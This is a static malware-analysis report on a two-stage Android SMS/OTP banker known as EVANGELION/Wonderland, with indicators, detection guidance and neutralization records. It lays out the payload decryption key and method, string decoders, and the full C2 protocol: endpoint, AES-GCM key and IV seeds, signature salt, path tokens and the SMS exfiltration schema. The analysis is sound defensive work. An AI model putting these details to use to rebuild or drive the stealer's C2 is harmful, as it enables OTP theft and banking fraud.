# Technical Analysis — EVANGELION / Wonderland Android SMS Banker

**Analysis date:** 2026-11-17

**Analyst artifact set:** two-stage Android dropper and SMS/OTP banker

**Original stage-1 SHA-256:** `8298a151bde2a84255d32f495f7c2baa85e60b466dbd33f22951e7e59de5c753`

**Original stage-2 SHA-256:** `55d6ac453a19ce6bedd30b16173e18dc74cc0f7a4b5f2579a8cc8b2105df22ba`

## 1. Scope and evidence standard

This report covers the chain from the initial dropper through payload recovery, installation, persistence, collection, command and control, exfiltration, and public attribution context. It also records exactly how the two published APKs were modified and statically verified.

Evidence labels used below:

- **Observed:** directly recovered from the APK, decompiled bytecode, manifest, resources, or decrypted asset.
- **Inferred:** a reasonable interpretation of an observed code path that was not exercised dynamically.
- **Unknown:** not established by the available sample or public evidence.

The original samples were analyzed statically. No request was sent to the C2, no Telegram interaction was performed, and no original or modified APK was executed on a device or emulator.

## 2. Executive summary

The first stage, package `it.sharp.hidden`, is a dropper with a deceptive update/file presentation. It carries a 371,344-byte encrypted asset named `assets/ylx0`. A cyclic XOR operation followed by AES-128-ECB decryption recovers a valid APK named `p_toydan8102.apk`. The dropper uses Android's `PackageInstaller` session API to request installation of that second stage.

The second stage, package `ai.your.tundra`, is the component responsible for theft and exfiltration. It registers a priority-999 SMS receiver and a notification listener, collects device/SIM/application/battery telemetry, supports SMS sending and USSD execution, and persists through boot and scheduled-job mechanisms. Incoming SMS records are queued locally and retried until the server acknowledges a batch.

C2 traffic is sent to `https://orehi.top/` as JSON containing Base64-encoded AES-256-GCM ciphertext. A custom timestamp/signature scheme authenticates the outer request. The decrypted JSON contains a path token selecting one of six recovered operations. The domain pool is stored locally and can be rotated by the server.

The sample includes Telegram chat ID `8731793636`. It does not include the corresponding bot token or evidence identifying the chat's controller. Public reporting supports family/cluster association with EVANGELION and Wonderland/WretchedCat, not attribution to a named individual.

## 3. Artifact provenance

### 3.1 Original artifacts analyzed

| Property | Stage 1 | Stage 2 |
|---|---|---|
| Analysis filename | `scammers_apk_file.apk` | `p_toydan8102.apk` |
| Original source | Supplied dropper, originally named `gg.apk` | Decrypted from stage-1 `assets/ylx0` |
| Size | 1,323,012 bytes | 371,330 bytes |
| SHA-256 | `8298a151bde2a84255d32f495f7c2baa85e60b466dbd33f22951e7e59de5c753` | `55d6ac453a19ce6bedd30b16173e18dc74cc0f7a4b5f2579a8cc8b2105df22ba` |
| Package | `it.sharp.hidden` | `ai.your.tundra` |
| Version | `95.95.36` / `16` | `4.76.57` / `81029621` |

### 3.2 Modified artifacts published

| Property | Modified stage 1 | Modified stage 2 |
|---|---|---|
| Filename | `scammers_apk_file.apk` | `p_toydan8102.apk` |
| Size | 750,283 bytes | 424,459 bytes |
| SHA-256 | `224ad223b2ea6fa56b02ae82411cb5b20f57eb1a5a2f22165f6f4e0b0bcc900a` | `5b5880673fa66b9265049d844c057f860f5177c15aef293ab19c86799a060749` |
| Label | `NEUTRALIZED RESEARCH SAMPLE` | `NEUTRALIZED RESEARCH SAMPLE` |
| Signer | `CN=RESEARCH-MODIFIED-SAMPLE, OU=MalwareAnalysis, O=DefensiveResearch` | Same |

The published files are deliberately different from the original samples. Original hashes appear only as indicators and provenance records.

## 4. Stage 1 — dropper

### 4.1 Presentation and installation behavior

**Observed:**

- Package name: `it.sharp.hidden`.
- Resources include fake update text and the label `Google Play` on the hidden alias; another application label resembles a filename, `To\`ydan arxivi(9).jpeg`.
- The launcher activity is `it.sharp.hidden.D8d8ksmXR`.
- `it.sharp.hidden.Play` is an initially disabled activity alias targeting that activity.
- The original manifest requests `REQUEST_INSTALL_PACKAGES` and `INTERNET` and declares foreground/VPN-related components.
- The installation flow uses `PackageInstaller.Session`, consistent with staged installation rather than simply writing an APK to shared storage.

**Inferred:** the presentation is intended to obtain user approval for installation of the recovered payload while appearing to be a legitimate update or file-related flow. User interaction and exact dialog sequencing were not dynamically tested.

### 4.2 Embedded payload recovery

The payload is stored as `assets/ylx0`, 371,344 bytes. Recovery is two transformations over the complete asset:

1. For each byte at index `i`, XOR with `TIwcHVIsbeO13zlm[i mod 16]`.
2. Decrypt the result with AES-128-ECB using the same 16-byte key.

The decrypted output is 371,330 bytes and has SHA-256 `55d6ac453a19ce6bedd30b16173e18dc74cc0f7a4b5f2579a8cc8b2105df22ba`. The output filename assembled by the malware is `p_toydan8102.apk`.

For an independently preserved original `ylx0` asset:

```bash
python tools/unpack_stage2.py /path/to/ylx0 /path/to/p_toydan8102.apk
```

Expected original-output digest:

```text
55d6ac453a19ce6bedd30b16173e18dc74cc0f7a4b5f2579a8cc8b2105df22ba
```

The published modified dropper does not contain `assets/ylx0`; the recovery tool therefore requires an asset preserved separately from the original sample.

### 4.3 Supporting and defense-evasion code

**Observed:**

- A `VpnService` declaration and VPN-related code are present.
- The dropper contains a list of 102 package names covering security, Play Store, system-management, and other applications.
- Components with obfuscated names support the staged installation and launch flow.
- The original stage-1 ZIP contains malformed/unusual entries and invalid resource types that impede ordinary decoding/rebuilding workflows.

**Inferred:** these features support defense evasion and analysis resistance. The exact runtime VPN routing effect was not established dynamically; this report does not claim that every listed package was blocked or blackholed.

## 5. Stage 2 — SMS/OTP banker

### 5.1 Package profile

**Observed:**

- Package: `ai.your.tundra`.
- `versionName`: `4.76.57`.
- `versionCode`: `81029621`.
- `minSdk`: 26.
- `targetSdk`: 34.
- Original signing scheme: v1 JAR signature.
- Original certificate subject: `CN=com.android.bluetooth.services`.
- Certificate SAN: `android@android.com`.
- Build identifiers: `toydan8102` and `evangelion_version_3`.

The certificate subject is an impersonation indicator; it is not evidence that the APK originated from Android or a Bluetooth service.

### 5.2 Original dangerous permissions and capabilities

| Permission / feature | Role in the chain |
|---|---|
| `READ_SMS` | Access stored SMS content |
| `RECEIVE_SMS` | Receive incoming SMS broadcasts |
| `SEND_SMS` | Send messages from the victim device |
| `READ_PHONE_STATE` | Phone and SIM-related identifiers/state |
| `CALL_PHONE` | Call/USSD-related capability |
| `QUERY_ALL_PACKAGES` | Broad installed-application inventory |
| `RECEIVE_BOOT_COMPLETED` | Restart behavior after boot |
| `INTERNET` | C2 transport |
| `REQUEST_IGNORE_BATTERY_OPTIMIZATIONS` | Persistence support |
| Foreground service type `specialUse` | Long-running execution support |
| Notification listener | Read and potentially suppress notification content, including OTPs |

The presence of a permission or API is an observed capability; use in every execution was not dynamically tested.

### 5.3 Component map

| Component | Observed role |
|---|---|
| `ai.your.tundra.Elqetortor` | `SMS_RECEIVED` receiver, priority 999, direct-boot aware |
| `ai.your.tundra.VaskuVael94` | Boot/system-event receiver with 21 trigger actions |
| `ai.your.tundra.FaQe34` | `NotificationListenerService`; notification access/suppression path |
| `ai.your.tundra.Intetrarbe` | Foreground service |
| `ai.your.tundra.TorRoya` | JobScheduler service |
| `ai.your.tundra.Nexyapeqekuv` | INFO-category activity with no meaningful user interface |
| `ai.your.tundra.Play` | Disabled decoy alias |

The SMS receiver's high priority increases the likelihood of processing messages before competing applications. The notification listener provides a second OTP-collection path for messages surfaced as notifications rather than read directly from the SMS provider.

### 5.4 Persistence and queueing

**Observed:**

- Boot/system broadcasts restart the payload's execution path.
- JobScheduler IDs `2001` and `2002` provide keepalive behavior.
- Incoming SMS entries are serialized into a JSON array under `eva_sms_queue`, key `pending`, in device-protected storage.
- A queue row is removed only after a non-empty successful JSON response; failures leave records available for retry.

**Inferred:** the queue is designed to tolerate offline periods and transient C2 failures, reducing loss of stolen messages.

### 5.5 String obfuscation

Six classes implement separate Base64/XOR transforms. The payload does not use one global decode routine; each class carries its own key byte array, iteration direction, and arithmetic expression.

| Python function | Original class | Direction | Transform applied to key byte `k` |
|---|---|---|---|
| `calar` | `umnex601.YagraQe29` | Forward | `b ^ (17-((-43)-(37-(18-(k^69)))))` |
| `vexar` | `g143mu.arcalk2.Calronoa` | Reverse | `(-78)-((-69)-(((-24)-(((k+99)-87)-5))+18))` |
| `inm` | `fatri3.Inmiteho3jqu` | Reverse | `(7-((((k^-96)^-51)^-34)-38))^54` |
| `ped` | `xg9r5jt4.PedielpiKQR` | Forward | `(((k^121)^26)-45)` |
| `gra` | `grayaa.kanex.arfaorkae0.GraBer40` | Forward | `(((((-41)-((k^-26)+15))+2)^6)^59)-116` |
| `cpx` | `plolu5.Calarxpexuca` | Forward | `(((((((k^36)^-122)+127)^115)+120)^7)-39` |

Python ports are provided in `tools/decoders.py`. Verified examples:

```text
inm("ytwm6i0BGV4=") -> messages
cpx("CGXBYmJiLv2g+VRbs9Q0VBNb/XBAWCXwmfRQPKuFB0I=")
  -> XqWEmMjUzXu5o7YtCOkWOwaXCUqRwfjb
gra("vmFxHDOOzmXT+w==") -> android_id
calar("d/WkLBzH6It8iw==") -> deviceName
vexar("GQC6KwtzIaU6PA==") -> 8731793636
ped("3wwxnA==") -> apps
```

Run an individual decoder with:

```bash
python tools/decoders.py 'GQC6KwtzIaU6PA==' vexar
```

### 5.6 TLS and analysis resistance

The class `InqeCalfa65` contains markers associated with proxy/MITM environments, including mitmproxy, Charles, Burp, Fiddler, Proxyman, HTTP Toolkit, and user-installed certificates. A tamper path raises `SSLPeerUnverifiedException`.

**Inferred:** this logic is intended to frustrate interception and analysis. Its effectiveness against a controlled instrumentation environment was not tested.

## 6. Command-and-control protocol

### 6.1 Endpoint and domain persistence

The recovered endpoint is:

```text
POST https://orehi.top/
```

The initial domain-pool string contains `orehi.top`, split on commas. It is persisted in `SharedPreferences` file `eva_requests`, key `main_domain`. Server responses can supply `rV` to replace the pool.

The visible URL remains `/`; semantic routing is performed by an encrypted `path` token in the plaintext JSON.

### 6.2 Outer request format

```http
POST / HTTP/1.1
Host: orehi.top
Content-Type: application/json
X-Timestamp: <Unix timestamp>
X-Signature: <lowercase SHA-256 hexadecimal>

{"result":"<Base64 ciphertext>"}
```

Signature construction:

```text
SHA256_HEX(raw_json_body + "|" + timestamp + "|DdQ3sfVT0RgviD358cpE0k")
```

### 6.3 Encryption

```text
Algorithm: AES/GCM/NoPadding
Key:       SHA-256("2fCpMDVTAE3ZbHHvqJM9T1xIpgJGKedY")
Key size:  256 bits
IV:        first 12 bytes of SHA-256("OTpkz8YYPT3Crz9m")
Tag size:  128 bits
Plaintext: JSON containing path and operation-specific fields
Body:      {"result": Base64(ciphertext)}
```

The `128` constant in the malware is the GCM authentication-tag length, not the AES key length. SHA-256 produces a 32-byte key, making the cipher AES-256-GCM.

The IV is fixed in the recovered code. Reusing a GCM nonce with the same key is cryptographically unsafe; this is an implementation weakness, not a requirement for defenders to reproduce traffic.

### 6.4 Response handling

If a response body starts with `{`, the client reads its `result` member and decrypts that value with the same key and IV. Otherwise, it treats the raw response body as encrypted content. A non-empty JSON object reply is treated as success.

The `rV` response field updates the domain pool. Other command-specific server behavior remains partly unknown.

## 7. Operations and exfiltration schema

### 7.1 Recovered handlers

| Path token | Operation | Principal fields |
|---|---|---|
| `27ImuEHa5uG1v6lVFLrM93GuLPs8Yydx` | Registration / new install | `androidId`, `deviceName`, `sdkVersion`, `chatId`, `buildVersion`, `version`, `forReversers`, `apps` |
| `XqWEmMjUzXu5o7YtCOkWOwaXCUqRwfjb` | SMS batch | `messages[]`: `simId`, `operator`, `sender`, `message` |
| `PNv7wk1KBY0WwQ4KrK2Tf3WhvVH4rRbl` | USSD result | `simId`, `ussdCode`, `response`, device block |
| `a9GjG2WtdB89Sa1tLY2IdN8wpHdvcg6D` | Polling / battery | Device block, `battery` |
| `NCRPHMNZxwFRnGYZjhtxuDDmekSvKSmGtCGfIyslNx` | State push | Device block |
| `GDgCblEzMeLCVeCoTOvEZOidczHuaCgbTYWPTXtzfw` | Phone/SIM inventory | Device block, `listPhones` |

### 7.2 Common device block

Recovered fields and values include:

```text
androidId    = Android ID
deviceName   = Build.MANUFACTURER + " " + Build.MODEL
sdkVersion   = Android SDK version
display      = Build.DISPLAY
chatId       = 8731793636
buildVersion = toydan8102
version      = evangelion_version_3
```

The `apps` registration field carries installed-application information. Phone/SIM inventory and USSD responses can expose operator, subscription, balance, and account-related data depending on the device and operator response.

### 7.3 SMS exfiltration

Each queued message has this logical shape:

```json
{
  "simId": "<subscription/SIM identifier>",
  "operator": "<operator name>",
  "sender": "<message sender>",
  "message": "<full SMS body>"
}
```

A batch is placed in `messages` and encrypted under the SMS path token. This is the clearest operator-facing relay path recovered in the sample. OTPs and other sensitive message content can therefore leave the device even if the user never opens the payload UI.

### 7.4 `forReversers` note

Registration includes a 446-byte Russian-language note addressed to reverse engineers and signed `wretchedcat`. Its presence is an observed string and attribution clue. It is not proof of an individual's legal identity.

## 8. Telegram and attribution assessment

### 8.1 What the sample establishes

- The payload includes numeric Telegram chat ID `8731793636`.
- Stolen data is handled by infrastructure associated with the C2 protocol.
- Public reporting links this family/tooling region to Telegram-based distribution and operations.

### 8.2 What the sample does not establish

- The bot username or bot token.
- The current controller of the chat ID.
- A person's name, telephone number, location, or legal identity.
- Whether the chat is directly operated by the malware author, a customer, or an intermediary.

Resolving that ID to an account owner requires evidence outside this APK, such as Telegram cooperation through an appropriate legal process, a lawfully obtained bot/infrastructure record, or another independently attributable dataset.

### 8.3 Public family context

- **EVANGELION:** self-identifying strings include `EVANGELION:` and `evangelion_version_3`; Starlabs ACT tracks EVANGELION provisionally.
- **Wonderland / WretchedCat:** Group-IB reporting uses these names and associates activity with the **TrickyWonders** cluster.
- **Assessment:** medium-confidence family/cluster overlap based on naming, tooling, protocol, and public reporting. No individual attribution is made.

## 9. Infrastructure observations

At analysis time, `orehi.top` resolved through Cloudflare to:

```text
188.114.96.3
188.114.97.3
2a06:98c1:3120::c
2a06:98c1:3121::c
```

These are edge addresses, not origin-server evidence. DNS and hosting can change after the observation date. No intrusion, origin-discovery attempt, or active exploitation was performed.

## 10. Detection and incident response

### 10.1 Host detection

- Unknown-source installation of `it.sharp.hidden`, especially when followed by `ai.your.tundra`.
- Priority SMS receivers and unexpected notification-listener grants.
- `eva_requests` with `main_domain` and `eva_sms_queue` with `pending` in app device-protected storage.
- JobScheduler IDs `2001` and `2002` associated with the payload.
- Original hashes and signing-certificate indicators in `IOCs.md`.

### 10.2 Network detection

- TLS SNI or DNS for `orehi.top`, with point-in-time caveat.
- `POST /` carrying JSON with only a `result` ciphertext member.
- `X-Timestamp` and `X-Signature` headers.
- Repeated encrypted polling and SMS-batch behavior from a newly installed application.

### 10.3 Response priorities

1. Preserve package, app-op, permission, notification-access, VPN, install-source, and relevant network evidence.
2. Isolate the device from operational accounts while preserving evidence.
3. Remove SMS/notification access and uninstall both packages after acquisition.
4. Review banking, email, messaging, and other OTP-protected accounts for unauthorized sessions or transactions.
5. Rotate exposed credentials from a known-clean device and invalidate active sessions.
6. Report infrastructure through hosting, registrar, Cloudflare, Telegram, and law-enforcement channels as appropriate.

## 11. Neutralization and verification

### 11.1 Modification objectives

The published APKs were changed to prevent the original chain from operating through their declared Android components while retaining code and resources useful for analysis. They are clearly differentiated by label, hash, size, and signing identity.

### 11.2 Stage-1 modification record

| Change | Result |
|---|---|
| Removed `assets/ylx0` | The original decrypt-and-install chain has no embedded second-stage payload to recover |
| Set application `android:enabled="false"` | Declared application components are disabled as shipped |
| Removed `INTERNET` | No normal Internet permission remains in the modified manifest |
| Removed `REQUEST_INSTALL_PACKAGES` | The modified manifest no longer requests package-install capability |
| Removed the install-permission attribute from the residual receiver | No residual reference remains to that permission |
| Changed `app_name` and `hidden_app_name` | Both display `NEUTRALIZED RESEARCH SAMPLE` |
| Normalized invalid resource types to `color` / `raw` | Allowed deterministic rebuild after decoding; application remains disabled |
| Re-signed | Research certificate identifies the file as modified |

Original dropper DEX and residual VPN/support code remain for analysis. Neutralization is based on removing the payload and disabling the application, not on claiming that every original class was deleted.

### 11.3 Stage-2 modification record

| Change | Result |
|---|---|
| Stubbed `XuteNexber.miskuorzi(...)` | Immediate `null`; no invocation instructions remain in the method body |
| Stubbed the long `XuteNexber` transport method | Immediate `null`; no invocation instructions remain in the method body |
| Set application `android:enabled="false"` | All declared components are disabled as shipped |
| Removed permissions | `READ_SMS`, `RECEIVE_SMS`, `SEND_SMS`, `CALL_PHONE`, `READ_PHONE_STATE`, `QUERY_ALL_PACKAGES`, `INTERNET`, `RECEIVE_BOOT_COMPLETED` |
| Removed SMS receiver | `Elqetortor` no longer declared |
| Removed boot receiver | `VaskuVael94` no longer declared |
| Removed notification listener | `FaQe34` no longer declared |
| Disabled foreground service | `Intetrarbe` has `android:enabled="false"` |
| Disabled job service | `TorRoya` has `android:enabled="false"` |
| Changed labels | `app_name` and `hidden_app_name` display `NEUTRALIZED RESEARCH SAMPLE` |
| Rebuilt and re-signed | Research certificate identifies the file as modified |

C2 constants, decoders, and other code strings remain intentionally for research. The shared network-dispatch methods cannot perform their original requests, and Android component activation is disabled.

### 11.4 Static verification performed

Both final signed APKs were decoded again with apktool 3.0.3. Automated checks confirmed:

**Stage 1**

- Application is disabled.
- `INTERNET` and `REQUEST_INSTALL_PACKAGES` are absent, including residual manifest references.
- `assets/ylx0` is absent from the ZIP archive.
- Both neutralized labels are present.
- JAR signature verification succeeds.
- Signer subject is `CN=RESEARCH-MODIFIED-SAMPLE, OU=MalwareAnalysis, O=DefensiveResearch`.

**Stage 2**

- Application is disabled.
- All eight targeted permissions are absent.
- SMS, boot, and notification-listener components are absent.
- Both background services are disabled.
- Both C2 method bodies contain only the immediate-null stub logic and no `invoke-*` instructions.
- Neutralized labels are present.
- JAR signature verification succeeds with the same research signer.

Representative verification commands:

```bash
java -jar apktool.jar d -f scammers_apk_file.apk -o verify-stage1
java -jar apktool.jar d -f p_toydan8102.apk -o verify-stage2
jarsigner -verify -verbose -certs scammers_apk_file.apk
jarsigner -verify -verbose -certs p_toydan8102.apk
sha256sum scammers_apk_file.apk p_toydan8102.apk
```

Expected published digests:

```text
224ad223b2ea6fa56b02ae82411cb5b20f57eb1a5a2f22165f6f4e0b0bcc900a  scammers_apk_file.apk
5b5880673fa66b9265049d844c057f860f5177c15aef293ab19c86799a060749  p_toydan8102.apk
```

The research certificate is self-signed and the JAR signatures have no trusted timestamp. Signature verification establishes internal integrity and research-signer identity, not Android trust or provenance from the malware author.

### 11.5 Verification boundary

No dynamic execution was performed. The static result is that the original payload-delivery, component-activation, sensitive-permission, and C2-dispatch paths are disabled as shipped. This is not a claim that malware-derived code is impossible to repair, re-enable, invoke through bespoke instrumentation, or reuse after further modification. The files should still be handled as research artifacts in an isolated analysis environment.

## 12. Open questions

- Complete server-side semantics of action/redirect responses.
- Whether additional domains existed in historical `rV` rotations.
- Origin infrastructure behind Cloudflare.
- Current controller of Telegram chat ID `8731793636`.
- Dynamic behavior of every VPN and anti-analysis branch.

These unknowns do not affect the recovered infection chain or the observed C2 protocol described above.

## 13. References

- Group-IB, *Choose Your Fighter: A New Stage in the Evolution of Android SMS Stealers in Uzbekistan*, December 2025.
- Starlabs ACT, Android C2 Tracker, family entry *EVANGELION (provisional)*.
- Local static analysis of the original APKs and decrypted `assets/ylx0`, 2026-11-17.
